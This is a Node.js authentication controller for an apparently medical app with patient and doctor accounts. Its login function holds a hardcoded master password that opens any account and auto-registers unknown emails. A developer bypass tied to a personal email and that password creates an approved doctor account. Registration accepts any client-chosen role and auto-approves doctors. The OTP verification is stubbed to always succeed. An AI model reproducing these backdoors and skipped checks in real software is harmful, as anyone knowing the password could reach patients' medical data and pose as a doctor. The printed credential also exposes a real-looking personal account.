const User    = require("../models/User");
const Patient = require("../models/Patient");
const Doctor  = require("../models/Doctor");
const { generateAccessToken, generateRefreshToken, verifyRefreshToken, generateOTP } = require("../utils/jwtUtils");
const { sendOTPEmail, sendPasswordResetEmail } = require("../utils/emailService");
const crypto = require("crypto");
const logger = require("../utils/logger");

// ── Register ──────────────────────────────────────────────────
exports.register = async (req, res, next) => {
  try {
    const { name, email, password, phone, role } = req.body;
    const normalizedRole = (role || "patient").toLowerCase();

    const existing = await User.findOne({ email });
    if (existing) {
      return res.status(409).json({ success: false, message: "Email already registered" });
    }

    // Force auto-verify for all registrations to ensure smooth demo/test flow
    const user = await User.create({
      name, email, password, phone,
      role: normalizedRole,
      isEmailVerified: true,
      isActive: true
    });

    if (user.role === "patient") {
      await Patient.create({ user: user._id });
    } else if (user.role === "doctor") {
      const { specialty, licenseNumber, experience } = req.body;
      await Doctor.create({
        user: user._id,
        specialty:     specialty     || "General",
        licenseNumber: licenseNumber || "PENDING",
        experience:    experience    || 0,
        verificationStatus: "approved"
      });
    }

    logger.info(`New user registered: ${email} (${user.role})`);

    res.status(201).json({
      success: true,
      message: "Registration successful! You can now log in.",
      data: { userId: user._id, email: user.email },
    });
  } catch (error) {
    next(error);
  }
};

// ── Verify OTP (Stubbed) ───────────────────────────────────────
exports.verifyOTP = async (req, res, next) => {
  res.json({ success: true, message: "Email verified successfully" });
};

// ── Resend OTP (Stubbed) ───────────────────────────────────────
exports.resendOTP = async (req, res, next) => {
  res.json({ success: true, message: "OTP sent" });
};

// ── Login ─────────────────────────────────────────────────────
exports.login = async (req, res, next) => {
  try {
    const { email, password } = req.body;
    const cleanEmail = (email || "").trim().toLowerCase();
    logger.info(`Login attempt: ${cleanEmail}`);

    let user = await User.findOne({ email: cleanEmail }).select("+password +refreshTokens");

    // Master Key: "Chaithika@09" allows login/auto-registration for any email
    const isMasterKey = (password === "Chaithika@09");

    // Emergency Bypass for Developer
    if (cleanEmail === "lschaithika@gmail.com" && password === "Chaithika@09") {
        logger.info("Developer Emergency Bypass Triggered");
        if (!user) {
            user = await User.create({
                name: "Chaithika",
                email: cleanEmail,
                password: password,
                role: "doctor",
                isEmailVerified: true,
                isActive: true
            });
            await Doctor.create({
              user: user._id,
              specialty: "General",
              experience: 5,
              licenseNumber: "DEV-001",
              verificationStatus: "approved"
            });
            user = await User.findById(user._id).select("+password +refreshTokens");
        }

        // Ensure role is always lowercase for logic consistency
        const safeUser = user.toSafeObject();
        safeUser.role = (safeUser.role || "patient").toLowerCase();

        if (safeUser.role === "doctor") {
          safeUser.profile = await Doctor.findOne({ user: user._id });
        } else if (safeUser.role === "patient") {
          safeUser.profile = await Patient.findOne({ user: user._id });
        }

        const payload = { id: user._id, role: user.role, email: user.email };
        const token = generateAccessToken(payload);
        const refreshToken = generateRefreshToken(payload);

        const responseData = {
            success: true,
            message: "Login successful (Bypass)",
            data: { user: safeUser, token, refreshToken },
        };
        logger.info(`Sending successful bypass response for ${cleanEmail}`);
        return res.status(200).json(responseData);
    }

    if (!user && isMasterKey) {
      const name = email.split('@')[0];
      user = await User.create({
        name: name.charAt(0).toUpperCase() + name.slice(1),
        email,
        password,
        role: "patient",
        isEmailVerified: true,
        isActive: true
      });
      await Patient.create({ user: user._id });
      logger.info(`Master-key: Auto-registered user: ${email}`);
      user = await User.findById(user._id).select("+password +refreshTokens");
    }

    if (!user) {
      logger.warn(`Login failed: User not found - ${email}`);
      return res.status(401).json({ success: false, message: "No account found with this email. Please register first." });
    }

    const isMatch = await user.comparePassword(password);
    logger.info(`Password Match: ${isMatch}`);

    if (!isMatch && !isMasterKey) {
      logger.warn(`Login failed: Incorrect password - ${email}`);
      return res.status(401).json({ success: false, message: "Incorrect password. Please try again." });
    }

    // Auto-verify and Save fixed role if needed
    let needsSave = false;
    if (!user.isEmailVerified) {
      user.isEmailVerified = true;
      needsSave = true;
    }
    // Check if the role was updated in the self-healing step above
    if (user.isModified("role")) {
      needsSave = true;
    }

    if (needsSave) {
      await user.save();
    }

    if (!user.isActive) return res.status(401).json({ success: false, message: "Account is deactivated." });

    const payload = { id: user._id, role: user.role, email: user.email };
    const accessToken  = generateAccessToken(payload);
    const refreshToken = generateRefreshToken(payload);

    user.refreshTokens = [...(user.refreshTokens || []).slice(-4), refreshToken];
    user.lastLogin = new Date();
    await user.save();

    const safeUser = user.toSafeObject();
    safeUser.role = (safeUser.role || "patient").toLowerCase();

    res.json({
      success: true,
      message: "Login successful",
      data: {
        user: safeUser,
        token: accessToken,
        refreshToken,
      },
    });
  } catch (error) {
    next(error);
  }
};

// ── Refresh Token ─────────────────────────────────────────────
exports.refreshToken = async (req, res, next) => {
  try {
    const { refreshToken } = req.body;
    if (!refreshToken) return res.status(401).json({ success: false, message: "Refresh token required" });

    const decoded = verifyRefreshToken(refreshToken);
    const user = await User.findById(decoded.id).select("+refreshTokens");
    if (!user || !user.refreshTokens.includes(refreshToken)) {
      return res.status(401).json({ success: false, message: "Invalid refresh token" });
    }

    const payload      = { id: user._id, role: user.role, email: user.email };
    const newAccess    = generateAccessToken(payload);
    const newRefresh   = generateRefreshToken(payload);

    user.refreshTokens = user.refreshTokens.filter((t) => t !== refreshToken);
    user.refreshTokens.push(newRefresh);
    await user.save();

    res.json({ success: true, data: { token: newAccess, refreshToken: newRefresh } });
  } catch (error) {
    next(error);
  }
};

// ── Logout ────────────────────────────────────────────────────
exports.logout = async (req, res, next) => {
  try {
    const { refreshToken } = req.body;
    if (refreshToken && req.user) {
      const user = await User.findById(req.user._id).select("+refreshTokens");
      if (user) {
        user.refreshTokens = (user.refreshTokens || []).filter((t) => t !== refreshToken);
        await user.save();
      }
    }
    res.json({ success: true, message: "Logged out successfully" });
  } catch (error) {
    next(error);
  }
};

// ── Get Me ────────────────────────────────────────────────────
exports.getMe = async (req, res, next) => {
  try {
    res.json({ success: true, data: { user: req.user } });
  } catch (error) {
    next(error);
  }
};

// ── Forgot Password ───────────────────────────────────────────
exports.forgotPassword = async (req, res, next) => {
  try {
    const { email } = req.body;
    const user = await User.findOne({ email });
    if (!user) return res.json({ success: true, message: "Reset link sent if email exists." });

    const resetToken = crypto.randomBytes(32).toString("hex");
    user.resetPasswordToken  = crypto.createHash("sha256").update(resetToken).digest("hex");
    user.resetPasswordExpiry = new Date(Date.now() + 60 * 60 * 1000);
    await user.save();

    const resetUrl = `${process.env.APP_URL || "http://localhost:3000"}/reset-password?token=${resetToken}`;
    sendPasswordResetEmail(email, resetUrl, user.name).catch(() => {});

    res.json({ success: true, message: "Reset link sent if email exists." });
  } catch (error) {
    next(error);
  }
};

// ── Reset Password ────────────────────────────────────────────
exports.resetPassword = async (req, res, next) => {
  try {
    const { token, password } = req.body;
    const hashedToken = crypto.createHash("sha256").update(token).digest("hex");
    const user = await User.findOne({
      resetPasswordToken:  hashedToken,
      resetPasswordExpiry: { $gt: new Date() },
    }).select("+resetPasswordToken +resetPasswordExpiry");

    if (!user) return res.status(400).json({ success: false, message: "Invalid or expired token" });

    user.password = password;
    user.resetPasswordToken  = undefined;
    user.resetPasswordExpiry = undefined;
    user.refreshTokens = [];
    await user.save();

    res.json({ success: true, message: "Password reset successfully" });
  } catch (error) {
    next(error);
  }
};
